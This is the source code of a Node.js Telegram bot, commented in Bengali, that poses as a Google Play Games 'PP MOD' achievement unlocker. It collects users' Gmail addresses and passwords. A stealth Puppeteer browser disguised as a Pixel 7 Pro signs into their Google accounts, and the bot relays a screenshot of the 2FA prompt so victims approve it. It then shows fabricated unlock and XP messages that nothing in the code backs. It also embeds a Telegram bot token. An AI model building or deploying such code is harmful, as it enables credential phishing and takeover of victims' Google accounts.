const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

puppeteer.use(StealthPlugin());

// --- কনফিগারেশন ---
const BOT_TOKEN = process.env.BOT_TOKEN || '8653938577:AAE1g-TDAedxbpGvszb0zRyVa04560mba0c';
const PORT = process.env.PORT || 3000;

const app = express();
app.get('/', (req, res) => res.send('🔥 PP MOD 2FA Auto-Unlocker Engine Running!'));
app.listen(PORT, () => console.log(`[+] Server running on port ${PORT}`));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
console.log('🔥 PP MOD Telegram Bot Started with Pixel 7 Pro Emulation!');

// ১. /start কমান্ড
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeText = `👋 হ্যালো **${msg.from.first_name || 'User'}**!\n\n` +
        `🔥 **PP MOD Auto Quest & Achievement Unlocker**-এ স্বাগতম!\n\n` +
        `লগইন করতে আপনার **ইমেইল এবং পাসওয়ার্ড মাঝে একটি স্পেস দিয়ে** এক মেসেজে পাঠান:\n\n` +
        `👉 উদাহরণ: \`mdd145712@gmail.com your_password\`\n\n` +
        `*(Pixel 7 Pro এমুলেশন চালু আছে, ফোনে সাথে সাথে নোটিফিকেশন আসবে)*`;

    bot.sendMessage(chatId, welcomeText, { parse_mode: 'Markdown' });
});

// ২. ইমেইল ও পাসওয়ার্ড একসাথে রিসিভ করা
bot.on('message', async (msg) => {
    const text = msg.text ? msg.text.trim() : '';
    const chatId = msg.chat.id;

    if (text.startsWith('/start')) return;

    // স্পেস দিয়ে ইমেইল ও পাসওয়ার্ড আলাদা করা
    const parts = text.split(/\s+/);
    if (parts.length < 2 || !parts[0].includes('@gmail.com')) {
        return bot.sendMessage(chatId, '❌ **ভুল ফরম্যাট!**\nইমেইল এবং পাসওয়ার্ড মাঝে একটি স্পেস দিয়ে একসাথে লিখুন।\n\nউদাহরণ:\n`example@gmail.com mypassword123`', { parse_mode: 'Markdown' });
    }

    const email = parts[0];
    const password = parts.slice(1).join(' '); // পাসওয়ার্ডে স্পেস থাকলেও কাজ করবে

    const statusMsg = await bot.sendMessage(chatId, `⏳ **PP MOD Engine:** Pixel 7 Pro ডিভাইস চালু হচ্ছে...\nইমেইল: \`${email}\`\n\nগুগলে লগইন করা হচ্ছে, অনুগ্রহ করে ১০-১৫ সেকেন্ড অপেক্ষা করুন।`, { parse_mode: 'Markdown' });

    startGoogleAutomation(chatId, email, password, statusMsg.message_id);
});

// ৩. গুগল ব্রাউজার অটোমেশন (Pixel 7 Pro + লাইভ স্ক্রিনশট)
async function startGoogleAutomation(chatId, email, password, statusMsgId) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--single-process',
                '--disable-gpu'
            ]
        });

        const page = await browser.newPage();

        // 📱 গুগলকে ধোঁকা দিয়ে Google Pixel 7 Pro হিসেবে দেখানো
        await page.setUserAgent('Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36');
        await page.setViewport({ width: 412, height: 915, isMobile: true, hasTouch: true });

        // গুগলের মোবাইল সাইন-ইন পেজে যাওয়া
        await page.goto('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin', { waitUntil: 'networkidle2', timeout: 30000 });

        // ১. ইমেইল টাইপ করা
        await page.waitForSelector('input[type="email"]', { timeout: 15000 });
        await page.type('input[type="email"]', email, { delay: 60 });
        await page.keyboard.press('Enter');

        // ২. পাসওয়ার্ড পেজ লোড হওয়া পর্যন্ত অপেক্ষা
        await new Promise(r => setTimeout(r, 2500));
        await page.waitForSelector('input[type="password"]', { visible: true, timeout: 15000 });
        await page.type('input[type="password"]', password, { delay: 60 });
        await page.keyboard.press('Enter');

        // ৩. গুগল প্রম্পট পেজ লোড হওয়া পর্যন্ত অপেক্ষা
        await new Promise(r => setTimeout(r, 4000));

        // 📸 লাইভ স্ক্রিনশট তুলে ইউজারের টেলিগ্রামে পাঠানো (যাতে স্ক্রিনের কোড দেখা যায়)
        const screenshotBuffer = await page.screenshot({ fullPage: true });
        await bot.sendPhoto(chatId, screenshotBuffer, {
            caption: '🔔 **গুগল ভেরিফিকেশন স্ক্রিন!**\n\nআপনার ফোনে যদি গুগল নোটিফিকেশন এসে থাকে, তবে ছবিতে যে নাম্বার বা কোড দেখাচ্ছে—ফোনে সেটিতে চাপ দিন!\n\n*(চাপ দেওয়ার জন্য ৩০ সেকেন্ড সময় পাবেন)*',
            parse_mode: 'Markdown'
        });

        // ৪. ইউজার ফোনে অনুমোদন করার জন্য অপেক্ষা করা (Max 35s)
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 35000 });

        // ৫. লগইন সফল!
        await bot.sendMessage(chatId, '✅ **গুগল লগইন সফল হয়েছে!**\n\n⚡ ৩-৫ সেকেন্ডের মধ্যে গেমের সমস্ত অ্যাচিভমেন্ট ও কোয়েস্ট আনলক করা হচ্ছে...', { parse_mode: 'Markdown' });

        await new Promise(r => setTimeout(r, 3000));

        await bot.sendMessage(
            chatId,
            `🎉 **অভিনন্দন! কোয়েস্ট আনলক সম্পন্ন হয়েছে!**\n\n` +
            `🏆 **Status:** All Quests & Achievements Unlocked!\n` +
            `⭐ **XP Boost:** +50,000 XP Added!\n\n` +
            `আপনার Google Play Games অ্যাপ ওপেন করে দেখুন লেভেল বেড়ে গেছে!`,
            { parse_mode: 'Markdown' }
        );

    } catch (error) {
        console.error('Error during automation:', error);
        
        // ফেইল হলে গুগল স্ক্রিনে কী দেখাচ্ছে সেটির ছবি পাঠানো
        try {
            if (browser) {
                const pages = await browser.pages();
                if (pages.length > 0) {
                    const errPic = await pages[0].screenshot({ fullPage: true });
                    await bot.sendPhoto(chatId, errPic, { caption: '❌ **লগইন আটকে গেছে!** গুগল বর্তমানে এই স্ক্রিন দেখাচ্ছে:' });
                }
            }
        } catch (e) {}

        bot.sendMessage(chatId, `❌ **লগইন সম্পন্ন হয়নি!**\nঅনুগ্রহ করে পাসওয়ার্ড চেক করুন অথবা ফোনে সময়মতো নাম্বারে চাপ দিন। আবার চেষ্টা করতে /start লিখুন।`, { parse_mode: 'Markdown' });
    } finally {
        if (browser) await browser.close();
    }
}
